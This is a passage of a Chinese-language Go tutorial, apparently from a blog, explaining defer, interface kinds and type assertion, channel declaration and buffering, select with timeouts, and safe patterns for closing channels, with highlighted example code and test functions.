<span class="number">2</span>, <span class="number">3</span>))       <span class="comment">// 6</span></span><br><span class="line">    fmt.Println(Sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)) <span class="comment">// 15</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="延迟调用（defer）"><a href="#延迟调用（defer）" class="headerlink" title="延迟调用（defer）"></a>延迟调用（defer）</h4><ul>
<li><code>defer</code>前缀可以将函数延迟到 return 前调用，常用于<code>mutex.Unlock()</code>或<code>file.Close()</code>前面<ul>
<li>多次 defer 会缓存到 stack 结构中，直到 return 前按 LIFO 顺序执行</li>
<li>defer 可以使相互关联的代码写在一起，更简洁易懂</li>
</ul>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Example_1</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printDefer</span><span class="params">()</span></span> &#123; <span class="comment">// SE2 1 0</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;S&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">defer</span> fmt.Printf(<span class="string">&quot;%d &quot;</span>, i) <span class="comment">// LIFO</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;E&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Example_2</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Contents</span><span class="params">(filename <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    f, err := os.Open(filename)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> f.Close()  <span class="comment">// f.Close will run when we&#x27;re finished.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result []<span class="type">byte</span></span><br><span class="line">    buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">100</span>)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        n, err := f.Read(buf[<span class="number">0</span>:])</span><br><span class="line">        result = <span class="built_in">append</span>(result, buf[<span class="number">0</span>:n]...)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err  <span class="comment">// f will be closed if we return here.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(result), <span class="literal">nil</span> <span class="comment">// f will be closed if we return here.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h3><ul>
<li>接口（interface）类型用于定义一个类型集（type set），但没有具体实现。<ul>
<li>方法（method）的名字必须是唯一的（unique），且不能是空白字符（not blank）</li>
<li>一个类型只要实现了接口中定义的所有方法，就可以赋值给该接口类型的变量（多态，隐式实现）</li>
<li>类型断言（type assertion, <code>r, ok = shape.(Rectangle)</code>）可以将一个接口类型的值转换为一个具体的类型</li>
</ul>
</li>
<li>接口分类：<ul>
<li>空接口（empty interface, <code>interface&#123;&#125;</code>）：类型集由所有非接口（non-interface）类型组成</li>
<li>基本接口（basic interface）：类型集完全由方法（method）组成</li>
<li>嵌套接口（embedded interface）：类型集中包含有其他的接口<ul>
<li>如果接口中出现了多个同名的方法，其声明必须是一致的</li>
</ul>
</li>
<li>泛型接口（general interface）：类型集中含有<code>~T</code>形式元素，其中<code>T</code>为非接口（non-interface）类型<ul>
<li>利用类型约束（type constraint）特性，限制一个接口类型只能被实现为某些特定的类型<ul>
<li><code>~int</code>限制为所有底层类型为 int 的类型</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-type-interface"><ul class="nav-tabs"><li class="tab active"><a href="#go-type-interface-1">EmptyInterface</a></li><li class="tab"><a href="#go-type-interface-2">EmbeddedInterface</a></li><li class="tab"><a href="#go-type-interface-3">GeneralInterface</a></li><li class="tab"><a href="#go-type-interface-4">Polymorphic</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-type-interface-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> any <span class="keyword">interface</span>&#123;&#125; <span class="comment">// (empty interface)</span></span><br><span class="line"></span><br><span class="line">    any = <span class="string">&quot;Hi&quot;</span></span><br><span class="line">    fmt.Println(any) <span class="comment">// Hi</span></span><br><span class="line"></span><br><span class="line">    any = <span class="number">123</span></span><br><span class="line">    fmt.Println(any) <span class="comment">// 123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-interface-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">interface</span> &#123;</span><br><span class="line">    Name() <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">interface</span> &#123;</span><br><span class="line">    Person</span><br><span class="line">    Salary() <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Manager <span class="keyword">interface</span> &#123;</span><br><span class="line">    Employee</span><br><span class="line">    TeamSize() <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SalesManager <span class="keyword">struct</span> &#123;</span><br><span class="line">    name     <span class="type">string</span></span><br><span class="line">    salary   <span class="type">float64</span></span><br><span class="line">    teamSize <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s SalesManager)</span></span> Name() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> s.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s SalesManager)</span></span> Salary() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> s.salary</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s SalesManager)</span></span> TeamSize() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> s.teamSize</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> m Manager</span><br><span class="line">    m = SalesManager&#123;name: <span class="string">&quot;Alice&quot;</span>, salary: <span class="number">5000.0</span>, teamSize: <span class="number">10</span>&#125;</span><br><span class="line">    fmt.Println(m.Name())     <span class="comment">// Alice</span></span><br><span class="line">    fmt.Println(m.Salary())   <span class="comment">// 5000</span></span><br><span class="line">    fmt.Println(m.TeamSize()) <span class="comment">// 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-interface-3"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Float <span class="keyword">interface</span> &#123;</span><br><span class="line">    ~<span class="type">float32</span> | ~<span class="type">float64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-interface-4"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define interface</span></span><br><span class="line"><span class="keyword">type</span> Shape <span class="keyword">interface</span> &#123;</span><br><span class="line">    Area() <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define struct（implicit implement Shape）</span></span><br><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">    Width  <span class="type">float64</span></span><br><span class="line">    Height <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> Area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.Width * r.Height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define struct（implicit implement Shape）</span></span><br><span class="line"><span class="keyword">type</span> Circle <span class="keyword">struct</span> &#123;</span><br><span class="line">    Radius <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Circle)</span></span> Area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Pi * c.Radius * c.Radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Interface as Parameter</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PrintArea</span><span class="params">(s Shape)</span></span> &#123;</span><br><span class="line">    fmt.Println(s.Area())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// polymorphic</span></span><br><span class="line">    r := Rectangle&#123;Width: <span class="number">3</span>, Height: <span class="number">4</span>&#125;</span><br><span class="line">    c := Circle&#123;Radius: <span class="number">5</span>&#125;</span><br><span class="line">    PrintArea(r) <span class="comment">// 12</span></span><br><span class="line">    PrintArea(c) <span class="comment">// 78.53981633974483</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// type assertion</span></span><br><span class="line">    <span class="keyword">var</span> s Shape</span><br><span class="line">    s = Rectangle&#123;Width: <span class="number">5</span>, Height: <span class="number">6</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> r, ok := s.(Rectangle); ok &#123;</span><br><span class="line">        fmt.Println(r.Width, r.Height) <span class="comment">// 5 6</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="Channel"><a href="#Channel" class="headerlink" title="Channel"></a>Channel</h3><ul>
<li>通道（channel）提供了一种在协程间通信数据的机制<ul>
<li>通道被关闭（<code>close()</code>）后，不能再 send 数据，但可 receive 数据（同时判断通道是否被关闭了）</li>
<li>通道的行为类似 FIFO 的队列（queue），receive 的顺序和 send 的顺序是一致的</li>
<li>select 语句可以同时等待多个 channel 的数据和事件<ul>
<li>每个 case 分支可以是 send、receive 或其他事件</li>
<li>如果多个 case 分支同时就绪，会随机选择其中一个分支执行</li>
<li>如果没有 case 分支就绪，会执行 default 分支或者阻塞等待</li>
</ul>
</li>
</ul>
</li>
<li>通道的声明：<ul>
<li><code>var ch chan&lt;- int</code> 声明只用于 send int 数据的通道</li>
<li><code>var ch &lt;-chan int</code> 声明只用于 receive int 数据的通道</li>
<li><code>var ch chan int</code> 声明可用于 send&amp;receive int 数据的通道</li>
</ul>
</li>
<li>通道的初始化：<ul>
<li><code>ch = make(chan int)</code> 创建一个用于 int 数据的 unbuffered 通道<ul>
<li>sender 会一直阻塞直到对应的值被 receiver 接收</li>
</ul>
</li>
<li><code>ch = make(chan int, 10)</code> 创建一个可缓存 10 个 int 数据的通道（类似 semaphore）<ul>
<li>sender 在 buffer 处于 full 状态时才会阻塞</li>
<li>receiver 在 buffer 处于 empty 状态时才会阻塞</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-type-channel"><ul class="nav-tabs"><li class="tab active"><a href="#go-type-channel-1">Basic</a></li><li class="tab"><a href="#go-type-channel-2">SelectMultiChannel</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-type-channel-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">producer</span><span class="params">(ch <span class="keyword">chan</span>&lt;- <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        ch &lt;- i</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consumer</span><span class="params">(ch &lt;-<span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// ok=true meaning ch not closed</span></span><br><span class="line">        value, ok := &lt;-ch</span><br><span class="line">        <span class="keyword">if</span> !ok &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(value) <span class="comment">// 0  1  2  3  4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> producer(ch)</span><br><span class="line">    <span class="keyword">go</span> consumer(ch)</span><br><span class="line"></span><br><span class="line">    time.Sleep(<span class="number">8</span> * time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-channel-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">producer</span><span class="params">(ch <span class="keyword">chan</span>&lt;- <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        ch &lt;- i</span><br><span class="line">        time.Sleep(time.Duration(i) * time.Second)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(ch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consumer</span><span class="params">(ch &lt;-<span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> value, ok := &lt;-ch:</span><br><span class="line">            <span class="keyword">if</span> !ok &#123;</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Println(value)</span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(<span class="number">2</span> * time.Second):</span><br><span class="line">            fmt.Println(<span class="string">&quot;timeout&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> producer(ch)</span><br><span class="line">    <span class="keyword">go</span> consumer(ch)</span><br><span class="line"></span><br><span class="line">    time.Sleep(<span class="number">8</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*[OUTPUT]</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">timeout</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h4 id="关闭通道"><a href="#关闭通道" class="headerlink" title="关闭通道"></a>关闭通道</h4><ul>
<li>通道关闭原则（推荐）：只应该让一个通道唯一的发送者关闭此通道<ul>
<li>通道只能在接收方检查是否已经关闭，且要等 close 前的数据已经消费完毕后才会检查到（依赖通道状态）</li>
<li>关闭一个已经关闭的通道将产生一个 panic ，因此 close 一个不知道是否已经关闭的通道是很危险的</li>
<li>向一个已关闭的通道 send 数据将产生一个 panic ，因此向一个不知道是否已经关闭的通道 send 数据是很危险的</li>
<li>Go 白皮书并不保证发生在一个通道上的并发关闭操作和发送操作不会产生数据竞争</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-type-channel-close"><ul class="nav-tabs"><li class="tab active"><a href="#go-type-channel-close-1">Basic</a></li><li class="tab"><a href="#go-type-channel-close-2">MultiReceiver</a></li><li class="tab"><a href="#go-type-channel-close-3">MultiSender</a></li><li class="tab"><a href="#go-type-channel-close-4">MultiSenderAndReceiver</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-type-channel-close-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doThing</span><span class="params">(data <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="comment">// ok=true表示数据是有效载荷，false在chan关闭后产生</span></span><br><span class="line">        <span class="comment">// chan已经关闭后，&lt;-ch 将不会阻塞</span></span><br><span class="line">        <span class="keyword">case</span> v, ok := &lt;-data:</span><br><span class="line">            <span class="keyword">if</span> !ok &#123;</span><br><span class="line">                fmt.Println(<span class="string">&quot;data has been closed&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            time.Sleep(time.Millisecond)</span><br><span class="line">            fmt.Printf(<span class="string">&quot;task %d is done\n&quot;</span>, v)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runExitByClose</span><span class="params">()</span></span> &#123;</span><br><span class="line">    data := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">go</span> doThing(data)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">        data &lt;- i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestExitByClose</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    t.Log(runtime.NumGoroutine())</span><br><span class="line">    runExitByClose()</span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">    runtime.GC()</span><br><span class="line">    t.Log(runtime.NumGoroutine())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-channel-close-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runMultiReceiver</span><span class="params">()</span></span> &#123;</span><br><span class="line">    log.SetFlags(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    dataCh := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Max = <span class="number">10000</span></span><br><span class="line">    sumSender := <span class="number">0</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> value := Max; ; value-- &#123;</span><br><span class="line">            <span class="keyword">if</span> value == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="comment">// 唯一的发送者可以安全地关闭dataCh通道</span></span><br><span class="line">                <span class="built_in">close</span>(dataCh)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dataCh &lt;- value</span><br><span class="line">            sumSender += value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> NumReceivers = <span class="number">10</span></span><br><span class="line">    sumReceiver := <span class="number">0</span></span><br><span class="line">    sumReceiveItems := <span class="built_in">make</span>([]<span class="type">int</span>, NumReceivers)</span><br><span class="line">    wgReceivers := sync.WaitGroup&#123;&#125;</span><br><span class="line">    wgReceivers.Add(NumReceivers)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; NumReceivers; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> wgReceivers.Done()</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 多个接收者互相竞争地接收数据，直到通道队列已空且被关闭</span></span><br><span class="line">            <span class="keyword">for</span> value := <span class="keyword">range</span> dataCh &#123;</span><br><span class="line">                sumReceiveItems[i] += value</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sumReceiver += sumReceiveItems[i]</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line">    wgReceivers.Wait()</span><br><span class="line">    log.Println(sumSender, sumReceiver, sumReceiveItems)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestRunMultiReceiver</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    t.Log(runtime.NumGoroutine())</span><br><span class="line">    runMultiReceiver()</span><br><span class="line">    t.Log(runtime.NumGoroutine())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-channel-close-3"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runMultiSender</span><span class="params">()</span></span> &#123;</span><br><span class="line">    log.SetFlags(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Max = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">const</span> NumSenders = <span class="number">10</span></span><br><span class="line">    <span class="keyword">const</span> NumReceivers = <span class="number">1</span></span><br><span class="line">    wgMain := sync.WaitGroup&#123;&#125;</span><br><span class="line">    wgMain.Add(NumSenders + NumReceivers)</span><br><span class="line"></span><br><span class="line">    dataCh := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    stopCh := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    sumSender := <span class="number">0</span></span><br><span class="line">    sumSendItems := <span class="built_in">make</span>([]<span class="type">int</span>, NumSenders)</span><br><span class="line">    wgSenders := sync.WaitGroup&#123;&#125;</span><br><span class="line">    wgSenders.Add(NumSenders)</span><br><span class="line">    <span class="keyword">for</span> i := NumSenders - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> wgMain.Done()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j := Max; ; j-- &#123;</span><br><span class="line">                value := <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="number">0</span> &#123;</span><br><span class="line">                    wgSenders.Done()</span><br><span class="line">                    wgSenders.Wait()</span><br><span class="line">                    sumSender += sumSendItems[i]</span><br><span class="line">                    log.Println(i, sumSendItems[i], sumSender)</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> j &gt; <span class="number">0</span> &#123;</span><br><span class="line">                    value = i*Max + j</span><br><span class="line">                    sumSendItems[i] += value</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> &lt;-stopCh:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">case</span> dataCh &lt;- value:</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sumReceiver := <span class="number">0</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> wgMain.Done()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> value := <span class="keyword">range</span> dataCh &#123;</span><br><span class="line">            <span class="keyword">if</span> value == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="comment">// 唯一的接收者可以安全地关闭stopCh通道</span></span><br><span class="line">                <span class="built_in">close</span>(stopCh)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sumReceiver += value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    wgMain.Wait()</span><br><span class="line">    log.Println(sumSender, sumSendItems, sumReceiver)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestRunMultiSender</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    t.Log(runtime.NumGoroutine())</span><br><span class="line">    runMultiSender()</span><br><span class="line">    t.Log(runtime.NumGoroutine())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-type-channel-close-4"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runMultiSenderAndReceiver</span><span class="params">()</span></span> &#123;</span><br><span class="line">    log.SetFlags(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> Max = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">const</span> NumSenders = <span class="number">10</span></span><br><span class="line">    <span class="keyword">const</span> NumReceivers = <span class="number">10</span></span><br><span class="line">    <span class="keyword">const</span> NumAgents = <span class="number">1</span></span><br><span class="line">    wgMain := sync.WaitGroup&#123;&#125;</span><br><span class="line">    wgMain.Add(NumSenders + NumReceivers + NumAgents)</span><br><span class="line"></span><br><span class="line">    dataCh := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    stopCh := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">    agentCh := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> stopper <span class="type">string</span></span><br><span class="line">    <span class="keyword">go</span> <span 